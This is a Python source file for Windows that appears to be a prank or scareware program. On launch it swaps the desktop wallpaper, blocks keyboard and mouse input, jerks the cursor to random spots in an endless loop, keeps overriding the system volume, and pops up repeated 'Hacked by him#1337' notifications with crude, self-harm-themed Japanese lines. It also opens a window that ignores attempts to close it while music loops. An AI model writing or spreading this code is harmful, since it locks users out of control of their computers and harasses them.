import resource
import ctypes
import pygame
import threading
import random
from ctypes import cast, POINTER
import win32api
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from win10toast import ToastNotifier
import time

ctypes.windll.user32.SystemParametersInfoW(20, 0, resource.folder+'desktop.png' ,3)

class Threadlib:
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    text = ["暇つぶした自殺未遂 嘔吐した真昼間のオーバードーズ",
            "おなかもよう晴れのち雨 落ち着かない真夜中の精神統一",
            "うんこが け陰毛 パスタ 胎児のドブ漬けゲロ風味",
            "布団潜ればまっくらのやみ 月曜日のメンタル逆エベレスト"]
    @staticmethod
    def setMouse():
        while True:
            win32api.SetCursorPos((random.randint(0,900),random.randint(0,900)))
            
    @staticmethod
    def keepkeyboard():
        ctypes.windll.user32.BlockInput(True)
    @staticmethod
    def setwave():
        while True:
            Threadlib.volume.SetMasterVolumeLevel(0, None)
    @staticmethod
    def sendmessage():
        toaster = ToastNotifier()
        while True:
            toaster.show_toast("Hacked by him#1337", text[random.randint(0,3)])
            time.sleep(random.randint(10,100))

def show():
    pygame.init()
    pygame.display.set_caption("yebuji")
    screen = pygame.display.set_mode([621, 500])
    screen.fill([255, 255, 205])
    img = pygame.image.load(resource.folder+'yebuji.bmp')
    screen.blit(img, [0, 0])
    pygame.display.flip()
    pygame.mixer.init()
    pygame.mixer.music.load(resource.folder+'music.mp3')
    pygame.mixer.music.play(-1)
    while True:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pass


def threads_item():
    th=[]
    for name ,items in Threadlib.__dict__.items():
        if isinstance(items ,staticmethod):
           
            exec("th.append("+"Threadlib."+name+")")
    return th


th = threads_item() #[Threadlib.keepkeyboard ,Threadlib.setMouse,Threadlib.setwave]
if __name__ == "__main__":
    for t in th:
        threading.Thread(target=t).start()

    show()
